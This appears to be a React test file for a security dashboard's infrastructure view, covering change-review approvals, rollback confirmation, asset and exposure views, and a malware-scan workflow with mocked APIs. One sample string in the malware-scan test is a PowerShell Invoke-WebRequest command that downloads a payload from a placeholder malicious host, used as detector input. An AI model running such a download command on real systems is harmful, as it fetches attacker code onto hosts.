import { fireEvent, render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { MemoryRouter, useLocation } from 'react-router-dom';
import Infrastructure from '../components/Infrastructure.jsx';
import { ToastProvider } from '../hooks.jsx';

const jsonOk = (data) => ({
  ok: true,
  status: 200,
  headers: { get: (header) => (header === 'content-type' ? 'application/json' : null) },
  json: async () => data,
  text: async () => JSON.stringify(data),
});

function renderInfrastructure(route = '/infrastructure') {
  return render(
    <MemoryRouter initialEntries={[route]}>
      <LocationProbe />
      <ToastProvider>
        <Infrastructure />
      </ToastProvider>
    </MemoryRouter>,
  );
}

function LocationProbe() {
  const location = useLocation();
  return <div data-testid="location-probe">{`${location.pathname}${location.search}${location.hash}`}</div>;
}

function currentLocation() {
  return new URL(
    screen.getByTestId('location-probe').textContent || '/infrastructure',
    'http://localhost',
  );
}

describe('Infrastructure', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    let review = {
      id: 'review-1',
      title: 'Review suspicious binary quarantine',
      asset_id: 'host-a:/tmp/dropper',
      change_type: 'malware_containment',
      source: 'malware-verdict',
      summary: 'Validate blast radius before quarantine.',
      risk: 'high',
      approval_status: 'pending_review',
      recovery_status: 'not_started',
      requested_by: 'admin',
      requested_at: '2026-04-26T08:00:00Z',
      required_approvers: 1,
      approvals: [],
      evidence: { path: '/tmp/dropper' },
    };

    globalThis.fetch = vi.fn((url, options = {}) => {
      const parsed = new URL(String(url), 'http://localhost');
      const path = parsed.pathname;
      const method = options.method || 'GET';

      if (path === '/api/remediation/change-reviews' && method === 'GET') {
        return Promise.resolve(
          jsonOk({
            summary: {
              total: 1,
              pending: review.approval_status === 'pending_review' ? 1 : 0,
              approved: review.approval_status === 'approved' ? 1 : 0,
              recovery_ready: ['ready', 'verified'].includes(review.recovery_status) ? 1 : 0,
              signed: review.approval_chain_digest ? 1 : 0,
              rollback_proofs: review.rollback_proof ? 1 : 0,
            },
            reviews: [review],
          }),
        );
      }

      if (path === '/api/remediation/change-reviews/review-1/approval' && method === 'POST') {
        review = {
          ...review,
          approval_status: 'approved',
          recovery_status: 'ready',
          approvals: [{ approver: 'admin', decision: 'approve', signature: 'sig-1' }],
          approval_chain_digest: 'chain-digest-1234567890',
          rollback_proof: {
            proof_id: 'rollback-proof-123456',
            status: 'ready',
            recovery_plan: ['Capture pre-change state for host-a:/tmp/dropper'],
          },
        };
        return Promise.resolve(jsonOk({ status: 'approved', review }));
      }

      if (path === '/api/remediation/change-reviews/review-1/rollback' && method === 'POST') {
        review = {
          ...review,
          recovery_status: 'verified',
          rollback_proof: {
            ...review.rollback_proof,
            status: 'dry_run_verified',
            execution_result: { dry_run: true, commands: [{ program: 'cp' }] },
          },
        };
        return Promise.resolve(jsonOk({ status: 'rollback_recorded', review }));
      }

      const defaults = {
        '/api/monitor/status': { status: 'ok' },
        '/api/threads/status': { threads: [] },
        '/api/slo/status': { status: 'ok' },
        '/api/system/health/dependencies': { dependencies: [] },
        '/api/ndr/report': { alerts: [] },
        '/api/drift/status': { changes: [] },
        '/api/vulnerability/summary': { findings: [] },
        '/api/container/stats': { containers: [] },
        '/api/certs/summary': { certificates: [] },
        '/api/certs/alerts': { alerts: [] },
        '/api/assets/summary': { assets: [] },
        '/api/malware/stats': { total_scans: 0 },
        '/api/malware/recent': { recent: [] },
        '/api/compliance/summary': { frameworks: [] },
        '/api/analytics': { endpoints: [] },
        '/api/traces': { traces: [] },
      };
      return Promise.resolve(jsonOk(defaults[path] || {}));
    });
  });

  it('records signed approval and verifies rollback proof from the overview', async () => {
    const user = userEvent.setup();
    renderInfrastructure();

    expect(await screen.findByText('Change Review & Recovery')).toBeInTheDocument();
    expect(screen.getByText('Review suspicious binary quarantine')).toBeInTheDocument();
    expect(screen.getByText('0/1 approvals')).toBeInTheDocument();

    await user.click(screen.getByRole('button', { name: 'Sign Approval' }));

    expect(await screen.findByText(/Chain chain-digest/)).toBeInTheDocument();
    expect(screen.getByText(/rollback-proof-123456/)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Verify Rollback' })).toBeInTheDocument();

    await user.click(screen.getByRole('button', { name: 'Verify Rollback' }));

    await waitFor(() => {
      expect(
        globalThis.fetch.mock.calls.some(
          ([url, options]) =>
            String(url) === '/api/remediation/change-reviews/review-1/rollback' &&
            (options?.method || 'GET') === 'POST',
        ),
      ).toBe(true);
    });
  });

  it('cancels live rollback when the typed hostname does not match', async () => {
    const user = userEvent.setup();
    const promptSpy = vi.fn().mockReturnValue('not-the-host');
    const originalPrompt = window.prompt;
    window.prompt = promptSpy;
    renderInfrastructure();

    expect(await screen.findByText('Change Review & Recovery')).toBeInTheDocument();
    await user.click(await screen.findByRole('button', { name: 'Sign Approval' }));
    await user.click(await screen.findByRole('button', { name: 'Verify Rollback' }));

    const liveButton = await screen.findByRole('button', { name: /Live Rollback/ });
    await user.click(liveButton);

    expect(promptSpy).toHaveBeenCalled();
    const liveCalls = globalThis.fetch.mock.calls.filter(
      ([url, options]) =>
        String(url) === '/api/remediation/change-reviews/review-1/rollback' &&
        (options?.method || 'GET') === 'POST' &&
        typeof options?.body === 'string' &&
        options.body.includes('"dry_run":false'),
    );
    expect(liveCalls).toHaveLength(0);
    window.prompt = originalPrompt;
  });

  it('submits a live rollback when the operator types the matching hostname', async () => {
    const user = userEvent.setup();
    const promptSpy = vi.fn().mockReturnValue('host-a:/tmp/dropper');
    const originalPrompt = window.prompt;
    window.prompt = promptSpy;
    renderInfrastructure();

    expect(await screen.findByText('Change Review & Recovery')).toBeInTheDocument();
    await user.click(await screen.findByRole('button', { name: 'Sign Approval' }));
    await user.click(await screen.findByRole('button', { name: 'Verify Rollback' }));

    const liveButton = await screen.findByRole('button', { name: /Live Rollback/ });
    await user.click(liveButton);

    await waitFor(() => {
      const liveCalls = globalThis.fetch.mock.calls.filter(
        ([url, options]) =>
          String(url) === '/api/remediation/change-reviews/review-1/rollback' &&
          (options?.method || 'GET') === 'POST' &&
          typeof options?.body === 'string' &&
          options.body.includes('"dry_run":false') &&
          options.body.includes('"confirm_hostname":"host-a:/tmp/dropper"'),
      );
      expect(liveCalls.length).toBeGreaterThanOrEqual(1);
    });
    window.prompt = originalPrompt;
  });

  it('restores the assets explorer from route state and refreshes grouped infrastructure data', async () => {
    const callCounts = {
      assetSummary: 0,
      vulnerabilitySummary: 0,
      certsSummary: 0,
      certsAlerts: 0,
      containerStats: 0,
      malwareStats: 0,
      malwareRecent: 0,
      driftStatus: 0,
    };
    const originalFetch = globalThis.fetch;

    globalThis.fetch = vi.fn(async (url, options = {}) => {
      const href = String(url);

      if (href.includes('/api/assets/summary')) {
        callCounts.assetSummary += 1;
        return jsonOk({
          assets: [
            {
              id: 'host-1',
              name: 'Critical asset host',
              platform: 'Linux',
              kind: 'asset',
              status: 'degraded',
              severity: 'high',
              priority: 'critical',
            },
          ],
        });
      }
      if (href.includes('/api/vulnerability/summary')) {
        callCounts.vulnerabilitySummary += 1;
        return jsonOk({
          findings: [
            {
              id: 'cve-1',
              asset_name: 'Critical asset host',
              cve: 'CVE-2026-0001',
              severity: 'critical',
            },
          ],
        });
      }
      if (href.includes('/api/certs/summary')) {
        callCounts.certsSummary += 1;
        return jsonOk({ certificates: [] });
      }
      if (href.includes('/api/certs/alerts')) {
        callCounts.certsAlerts += 1;
        return jsonOk({
          alerts: [
            {
              id: 'cert-1',
              common_name: 'api.wardex.local',
              days_remaining: 6,
              status: 'expiring',
            },
          ],
        });
      }
      if (href.includes('/api/container/stats')) {
        callCounts.containerStats += 1;
        return jsonOk({
          containers: [
            {
              id: 'container-1',
              name: 'payments-api',
              runtime: 'containerd',
              severity: 'high',
              status: 'running',
            },
          ],
        });
      }
      if (href.includes('/api/malware/stats')) {
        callCounts.malwareStats += 1;
        return jsonOk({
          database: { total_hashes: 12 },
          scanner: { total_scans: 5, malicious_count: 1 },
          yara_rules: 4,
        });
      }
      if (href.includes('/api/malware/recent')) {
        callCounts.malwareRecent += 1;
        return jsonOk([
          {
            sha256: 'abc123',
            name: 'LoaderX',
            family: 'Loader',
            severity: 'critical',
            detected_at: '2026-04-24T08:00:00Z',
          },
        ]);
      }
      if (href.includes('/api/drift/status')) {
        callCounts.driftStatus += 1;
        return jsonOk({
          changes: [{ id: 'drift-1', path: '/etc/ssh/sshd_config', type: 'removed' }],
        });
      }

      return originalFetch(url, options);
    });

    renderInfrastructure('/infrastructure?tab=assets&view=critical&q=Critical&asset=host-1');

    expect((await screen.findAllByText('Critical asset host')).length).toBeGreaterThan(0);
    expect(await screen.findByDisplayValue('Critical')).toBeInTheDocument();
    expect(currentLocation().searchParams.get('tab')).toBe('assets');
    expect(currentLocation().searchParams.get('view')).toBe('critical');
    expect(currentLocation().searchParams.get('q')).toBe('Critical');
    expect(currentLocation().searchParams.get('asset')).toBe('host-1');

    const refreshButton = await screen.findByRole('button', { name: 'Refresh' });

    await waitFor(() => {
      expect(callCounts.assetSummary).toBeGreaterThan(0);
      expect(callCounts.vulnerabilitySummary).toBeGreaterThan(0);
      expect(callCounts.certsSummary).toBeGreaterThan(0);
      expect(callCounts.certsAlerts).toBeGreaterThan(0);
      expect(callCounts.containerStats).toBeGreaterThan(0);
      expect(callCounts.malwareStats).toBeGreaterThan(0);
      expect(callCounts.malwareRecent).toBeGreaterThan(0);
      expect(callCounts.driftStatus).toBeGreaterThan(0);
    });

    const initialCounts = { ...callCounts };

    fireEvent.click(refreshButton);

    await waitFor(() => {
      expect(callCounts.assetSummary).toBe(initialCounts.assetSummary + 1);
      expect(callCounts.vulnerabilitySummary).toBe(initialCounts.vulnerabilitySummary + 1);
      expect(callCounts.certsSummary).toBe(initialCounts.certsSummary + 1);
      expect(callCounts.certsAlerts).toBe(initialCounts.certsAlerts + 1);
      expect(callCounts.containerStats).toBe(initialCounts.containerStats + 1);
      expect(callCounts.malwareStats).toBe(initialCounts.malwareStats + 1);
      expect(callCounts.malwareRecent).toBe(initialCounts.malwareRecent + 1);
      expect(callCounts.driftStatus).toBe(initialCounts.driftStatus + 1);
    });
  });

  it('restores the integrity workspace, runs a deep malware scan, and updates verdict route state', async () => {
    const sample = 'powershell Invoke-WebRequest https://malicious.example/payload';
    const scanBodies = [];
    const originalFetch = globalThis.fetch;

    globalThis.fetch = vi.fn(async (url, options = {}) => {
      const href = String(url);
      const method = String(options?.method || 'GET').toUpperCase();

      if (href.includes('/api/malware/stats')) {
        return jsonOk({
          database: { total_hashes: 12, by_family: { LockBit: 2 }, by_severity: { critical: 2 } },
          scanner: {
            total_scans: 5,
            malicious_count: 2,
            suspicious_count: 1,
            clean_count: 2,
            avg_scan_time_us: 1200,
          },
          yara_rules: 4,
        });
      }
      if (href.includes('/api/malware/recent')) {
        return jsonOk([
          {
            sha256: 'abc123',
            name: 'LockBit Loader',
            family: 'LockBit',
            severity: 'critical',
            detected_at: '2024-01-01T00:00:00Z',
            source: 'built-in',
          },
        ]);
      }
      if (href.includes('/api/scan/buffer/v2') && method === 'POST') {
        const body = JSON.parse(options.body);
        scanBodies.push(body);
        return jsonOk({
          scan: {
            verdict: 'malicious',
            confidence: 0.91,
            malware_family: 'Loader',
            static_score: {
              score: 84,
              band: 'likely_malicious',
              rationale: ['Behavior and script indicators raised confidence.'],
            },
            matches: [
              {
                layer: 'behavior',
                rule_name: 'runtime_behavior',
                severity: 'high',
                detail: 'observed tactics: suspicious_process_tree, c2_beaconing',
              },
            ],
          },
          static_profile: {
            file_type: 'powershell',
            platform_hint: 'script',
            probable_signed: false,
            trusted_publisher_match: 'microsoft',
            internal_tool_match: null,
            suspicious_traits: ['script-like content benefits from command inspection'],
            analyst_summary: ['Detected powershell content for the script execution surface.'],
          },
          behavior_profile: {
            severity: 'high',
            observed_tactics: ['suspicious_process_tree', 'c2_beaconing'],
            allowlist_match: 'microsoft',
            recommended_actions: [
              'Review script body for network, credential, and persistence commands.',
              'Pivot to NDR beaconing results for related destinations.',
            ],
          },
          analyst_summary: [
            'Verdict: malicious with 91% confidence.',
            'Detected powershell content for the script execution surface.',
          ],
        });
      }

      return originalFetch(url, options);
    });

    renderInfrastructure('/infrastructure?tab=integrity&malware=abc123&malwarePanel=provenance');

    expect(await screen.findByText('Deep Malware Scan')).toBeInTheDocument();
    expect(await screen.findByText('Recent Malware Triage')).toBeInTheDocument();
    expect(await screen.findByText('Malware Verdict Workspace')).toBeInTheDocument();
    expect(currentLocation().searchParams.get('tab')).toBe('integrity');
    expect(currentLocation().searchParams.get('malware')).toBe('abc123');
    expect(currentLocation().searchParams.get('malwarePanel')).toBe('provenance');

    fireEvent.change(screen.getByLabelText('Sample filename'), {
      target: { value: 'invoice_update.ps1' },
    });
    fireEvent.change(screen.getByLabelText('Sample content or script body'), {
      target: { value: sample },
    });
    fireEvent.click(screen.getByLabelText('Suspicious process tree'));
    fireEvent.click(screen.getByLabelText('C2 beaconing'));
    fireEvent.change(screen.getByLabelText('Trusted publishers'), {
      target: { value: 'microsoft' },
    });
    fireEvent.change(screen.getByLabelText('Internal tools'), {
      target: { value: 'corp-updater' },
    });
    fireEvent.click(screen.getByRole('button', { name: 'Run Deep Scan' }));

    await waitFor(() => {
      expect(scanBodies).toEqual([
        {
          data: globalThis.Buffer.from(sample).toString('base64'),
          filename: 'invoice_update.ps1',
          behavior: {
            suspicious_process_tree: true,
            defense_evasion: false,
            persistence_installed: false,
            c2_beaconing_detected: true,
            credential_access: false,
          },
          allowlist: {
            trusted_publishers: ['microsoft'],
            internal_tools: ['corp-updater'],
          },
        },
      ]);
      expect(currentLocation().searchParams.get('tab')).toBe('integrity');
      expect(currentLocation().searchParams.get('malware')).toBe('abc123');
      expect(currentLocation().searchParams.get('malwarePanel')).toBe('summary');
    });

    expect((await screen.findAllByText(/malicious/i)).length).toBeGreaterThan(0);
    expect((await screen.findAllByText(/powershell/i)).length).toBeGreaterThan(0);
    expect(await screen.findByRole('button', { name: 'Verdict Summary' })).toBeInTheDocument();
    expect(
      await screen.findByText(/Trusted publisher allowlist matched "microsoft"/i),
    ).toBeInTheDocument();
  });

  it('pivots a selected asset into the exposure workspace and preserves route-backed scope', async () => {
    const originalFetch = globalThis.fetch;

    globalThis.fetch = vi.fn(async (url, options = {}) => {
      const href = String(url);

      if (href.includes('/api/assets/summary')) {
        return jsonOk({
          assets: [
            {
              id: 'host-1',
              name: 'Critical asset host',
              platform: 'Linux',
              kind: 'asset',
              status: 'degraded',
              severity: 'high',
              priority: 'critical',
            },
          ],
        });
      }
      if (href.includes('/api/vulnerability/summary')) {
        return jsonOk({
          findings: [
            {
              id: 'cve-1',
              asset_name: 'Critical asset host',
              cve: 'CVE-2026-0001',
              severity: 'critical',
            },
          ],
        });
      }
      if (href.includes('/api/certs/summary')) {
        return jsonOk({ certificates: [{ common_name: 'api.wardex.local', expires_at: '2026-05-12T00:00:00Z' }] });
      }
      if (href.includes('/api/certs/alerts')) {
        return jsonOk({
          alerts: [
            {
              id: 'cert-1',
              common_name: 'api.wardex.local',
              days_remaining: 6,
              status: 'expiring',
            },
          ],
        });
      }
      if (href.includes('/api/container/stats')) {
        return jsonOk({
          containers: [
            {
              id: 'container-1',
              name: 'payments-api',
              runtime: 'containerd',
              severity: 'high',
              status: 'running',
            },
          ],
        });
      }
      if (href.includes('/api/ndr/report')) {
        return jsonOk({
          findings: [
            {
              id: 'ndr-1',
              title: 'Beaconing to suspicious destination',
              severity: 'high',
            },
          ],
        });
      }

      return originalFetch(url, options);
    });

    renderInfrastructure('/infrastructure?tab=assets&view=critical&asset=host-1');

    expect((await screen.findAllByText('Critical asset host')).length).toBeGreaterThan(0);
    expect(currentLocation().searchParams.get('tab')).toBe('assets');
    expect(currentLocation().searchParams.get('asset')).toBe('host-1');

    fireEvent.click(await screen.findByRole('button', { name: 'Open Related Exposure' }));

    await waitFor(() => {
      expect(currentLocation().searchParams.get('tab')).toBe('exposure');
      expect(currentLocation().searchParams.get('asset')).toBe('host-1');
    });

    expect(await screen.findByText('Exposure Narrative')).toBeInTheDocument();
    expect(await screen.findByText('Vulnerability Summary')).toBeInTheDocument();
    expect(await screen.findByText('Certificate Summary')).toBeInTheDocument();
    expect(await screen.findByText('Container Risk')).toBeInTheDocument();
    expect((await screen.findAllByText('CVE-2026-0001')).length).toBeGreaterThan(0);
    expect(await screen.findByText(/Current scope: Critical asset host/i)).toBeInTheDocument();
  });

  it('restores the observability workspace from route state and keeps selected asset context visible', async () => {
    const originalFetch = globalThis.fetch;

    globalThis.fetch = vi.fn(async (url, options = {}) => {
      const href = String(url);

      if (href.includes('/api/assets/summary')) {
        return jsonOk({
          assets: [
            {
              id: 'host-1',
              name: 'Critical asset host',
              platform: 'Linux',
              kind: 'asset',
              status: 'degraded',
              severity: 'high',
              priority: 'critical',
              updated_at: '2026-05-02T10:00:00Z',
            },
          ],
        });
      }
      if (href.includes('/api/threads/status')) {
        return jsonOk({ threads: [{ name: 'collector', state: 'running' }] });
      }
      if (href.includes('/api/system/health/dependencies')) {
        return jsonOk({ dependencies: [{ name: 'prometheus', status: 'ok' }] });
      }
      if (href.includes('/api/slo/status')) {
        return jsonOk({ health_gate: 'green', error_budget_remaining: 99.2 });
      }
      if (href.includes('/api/analytics')) {
        return jsonOk({ endpoints: [{ path: '/api/alerts', count: 12 }], busiest_endpoint: '/api/alerts' });
      }
      if (href.includes('/api/traces')) {
        return jsonOk({
          generated_at: '2026-05-02T10:05:00Z',
          traces: [
            { id: 'trace-1', service: 'collector', root_span: 'ingest_batch', status: 'ok' },
            { id: 'trace-2', service: 'api', root_span: 'alerts_list', status: 'degraded' },
          ],
        });
      }

      return originalFetch(url, options);
    });

    renderInfrastructure('/infrastructure?tab=observability&asset=host-1');

    await waitFor(() => {
      expect(currentLocation().searchParams.get('tab')).toBe('observability');
      expect(currentLocation().searchParams.get('asset')).toBe('host-1');
    });

    expect(await screen.findByText('Threads and Services')).toBeInTheDocument();
    expect(await screen.findByText('Dependency Health')).toBeInTheDocument();
    expect(await screen.findByText('API Analytics')).toBeInTheDocument();
    expect(await screen.findByText('Telemetry Detail')).toBeInTheDocument();
    expect(await screen.findByText(/Current scope: Critical asset host • asset/i)).toBeInTheDocument();
    expect(await screen.findByText('Trace Samples')).toBeInTheDocument();
    expect((await screen.findAllByText('trace-1')).length).toBeGreaterThan(0);
    expect((await screen.findAllByText('ingest_batch')).length).toBeGreaterThan(0);
    expect((await screen.findAllByText('alerts_list')).length).toBeGreaterThan(0);
    expect(await screen.findByText('Trace collector detail')).toBeInTheDocument();
  });
});
